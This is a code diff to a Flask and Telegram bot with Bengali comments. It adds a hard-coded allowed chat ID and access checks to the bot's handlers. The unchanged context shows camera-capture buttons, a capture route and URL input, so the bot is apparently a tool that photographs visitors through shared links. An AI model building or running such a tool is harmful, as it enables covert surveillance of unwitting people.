@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import io
 import uuid
@@ -23,6 +24,18 @@ app = Flask(__name__)
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 CHAT_ID = os.environ.get("CHAT_ID", "")
 PUBLIC_URL = os.environ.get("PUBLIC_URL", "")
+
+# ===============================
+# অনুমোদিত Chat ID (একটি বা কমা-সেপারেটেড)
+# আপনি দিয়েছেন: 7243012875
+# পরিবেশভ্যারিয়েবলও ব্যবহার করতে পারেন (ALLOWED_CHAT_ID)
+ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875")
+ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}
+
+
+def is_authorized_chat(chat_id):
+    return str(chat_id) in ALLOWED_CHAT_IDS
+# ===============================
 
 if not BOT_TOKEN or not CHAT_ID:
     print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
@@ -372,6 +385,10 @@ def capture():
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """শুরুতে Front / Back Camera বাটন"""
+    if not is_authorized_chat(update.effective_chat.id):
+        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        return
+
     keyboard = [
         [
             InlineKeyboardButton("📸 Front Camera", callback_data="cam_front"),
@@ -391,6 +408,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """বাটন ক্লিক হ্যান্ডলার"""
     query = update.callback_query
     await query.answer()
+
+    # অনুমোদন চেক
+    if not is_authorized_chat(query.message.chat_id):
+        await query.edit_message_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        return
+
     data = query.data
     chat_id = str(query.message.chat_id)
 
@@ -477,6 +500,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """URL ইনপুট ধরার জন্য"""
+    if not is_authorized_chat(update.effective_chat.id):
+        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
+        return
+
     chat_id = str(update.message.chat_id)
     session = user_sessions.get(chat_id, {})
 
